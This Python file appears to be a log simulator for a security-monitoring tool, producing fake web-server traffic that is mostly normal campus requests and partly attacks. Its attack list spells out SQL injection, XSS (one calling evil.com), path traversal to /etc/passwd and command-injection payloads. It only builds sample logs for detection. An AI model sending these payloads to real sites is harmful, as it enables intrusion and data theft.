"""
IDXSOC — Realistic Log Simulator
Generates believable mixed traffic: 80% normal, 20% attack
"""
import random
import time
from datetime import datetime
from ai_engine import FAKE_GEO

# ─── Normal traffic pool ──────────────────────────────────────────────────────
NORMAL_PAGES = [
    "/", "/index.php", "/about", "/contact", "/courses",
    "/students/portal", "/library", "/timetable", "/results",
    "/notices", "/gallery", "/admissions", "/fees",
    "/staff/login", "/assets/style.css", "/assets/logo.png",
    "/api/attendance", "/api/marks", "/favicon.ico",
]
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
]
CAMPUS_IPS = [f"192.168.{random.randint(1, 10)}.{random.randint(2, 254)}" for _ in range(25)]

# ─── Attack traffic pool ──────────────────────────────────────────────────────
ATTACK_POOL = [
    # SQLi
    ("/login.php?username=admin'--&password=x",              "sqlmap/1.7 (https://sqlmap.org)", "POST"),
    ("/search?q=1' UNION SELECT 1,user(),3--",               "Mozilla/5.0 (compatible; scanner)", "GET"),
    ("/index.php?id=1 AND SLEEP(5)--",                       "curl/7.88.1", "GET"),
    ("/student?id=1' OR '1'='1",                             "python-requests/2.31.0", "GET"),
    ("/api/login", "Mozilla/5.0",                            "POST"),  # brute-force trigger
    # XSS
    ("/search?q=<script>alert('XSS')</script>",              "Mozilla/5.0 Firefox/119", "GET"),
    ("/comment?msg=<img src=x onerror=fetch('//evil.com')>", "Mozilla/5.0 Chrome/117", "POST"),
    # LFI / Path Traversal
    ("/download.php?file=../../../../etc/passwd",            "Wget/1.21.3", "GET"),
    ("/view?page=../../../windows/system32/cmd.exe",         "go-http-client/2.0", "GET"),
    # Scanner
    ("/",                                                    "Nikto/2.1.6", "GET"),
    ("/wp-admin/",                                           "sqlmap/1.7", "GET"),
    # Admin probe
    ("/.env",                                               "python-requests/2.28.0", "GET"),
    ("/phpmyadmin/",                                        "Mozilla/5.0", "GET"),
    ("/.git/config",                                        "curl/7.88.1", "GET"),
    # Command Injection
    ("/ping?host=127.0.0.1;id",                             "Mozilla/5.0", "GET"),
    ("/exec?cmd=ls+-la",                                    "python-requests/2.31.0", "POST"),
]


_id_counter = [10000]


def _next_id():
    _id_counter[0] += 1
    return f"SIM-{_id_counter[0]:06d}"


def generate_normal_entry() -> dict:
    geo = random.choice(CAMPUS_IPS)
    page = random.choice(NORMAL_PAGES)
    status = random.choices([200, 304, 404, 301], weights=[80, 10, 7, 3])[0]
    return {
        "id": _next_id(),
        "ip": geo,
        "timestamp": datetime.utcnow().isoformat(),
        "method": random.choice(["GET", "GET", "GET", "POST"]),
        "request": page,
        "status": status,
        "bytes": str(random.randint(200, 50000)),
        "user_agent": random.choice(NORMAL_UAS),
        "referer": "-",
        "source": "web_server",
        "raw": f'{geo} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET {page} HTTP/1.1" {status} {random.randint(200,5000)}',
    }


def generate_attack_entry() -> dict:
    req, ua, method = random.choice(ATTACK_POOL)
    geo_info = random.choice(FAKE_GEO)
    ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    status = random.choice([200, 400, 403, 500])
    return {
        "id": _next_id(),
        "ip": ip,
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "request": req,
        "status": status,
        "bytes": str(random.randint(100, 3000)),
        "user_agent": ua,
        "referer": "-",
        "source": "web_server",
        "geo": geo_info,
        "raw": f'{ip} - - [{datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {req} HTTP/1.1" {status} {random.randint(100,3000)} "-" "{ua}"',
    }


def generate_batch(count: int = 10) -> list[dict]:
    """Generate a batch with ~20% attack ratio."""
    entries = []
    for _ in range(count):
        if random.random() < 0.20:
            entries.append(generate_attack_entry())
        else:
            entries.append(generate_normal_entry())
    return entries
